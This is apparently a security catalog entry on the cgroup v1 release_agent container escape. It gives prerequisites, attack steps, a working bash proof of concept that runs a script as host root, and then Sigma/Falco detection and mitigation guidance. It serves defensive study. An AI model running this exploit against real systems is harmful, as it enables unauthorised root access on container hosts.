---
id: CE-001
name: cgroup release_agent abuse
category: kernel/cgroup
mitre_attack: [T1611, T1068]
risk: critical
detection_rules: [SIGMA-001, FALCO-001]
---

# CE-001 — cgroup release_agent abuse

## Summary

The classic cgroup v1 escape. When a cgroup's `notify_on_release` is enabled, the
kernel executes the `release_agent` binary — whose path lives in the cgroup mount
root — as **root on the host** whenever the cgroup's last process exits. If the
container has a writable cgroup v1 hierarchy and `CAP_SYS_ADMIN`, it can point the
release_agent at any host path it can write to.

## Prerequisites

- `CAP_SYS_ADMIN` in the container
- A cgroup v1 controller mounted read-write (e.g. `rdma`, often unpatched)
- Ability to write a file at a host-visible path (e.g. inside a mounted volume)

## Attack path

1. Mount a writable cgroup controller: `mount -t cgroup -o rdma cgroup /tmp/cgrp`
2. Create a child cgroup and set `notify_on_release = 1`
3. Write `host_path_to_payload` into the mount-root `release_agent` file
4. Write the payload script into a host-reachable location
5. Trigger: move a process into the child cgroup, then kill it

## PoC sketch

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/pwned" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

On success, `pwned` appears in the host-reachable path containing the output of
`id` executed as host root.

## Detection

- **Logs:** host auditd — `execve` of the payload from a `kworker` context; any
  write to `*/release_agent` or `notify_on_release=1`
- **Sigma:** `SIGMA-001` — writes to `release_agent`
- **Falco:** `FALCO-001` — open/write on `/sys/fs/cgroup/*/release_agent`
- **Forensics:** inspect cgroup mounts inside running containers
  (`/proc/self/mounts` for `cgroup` with `rw`)

## Mitigation

- Use cgroup v2 only (unified hierarchy; no release_agent mechanism)
- Do not mount cgroup filesystems into containers
- Drop `CAP_SYS_ADMIN`; keep containers unprivileged
- Enforce with admission policies (deny cgroup volume mounts)

## References

- Trail of Bits — Understanding Docker container escapes
- Felix Wilhelm's original technique write-up
- MITRE ATT&CK T1611 (Container Escape)
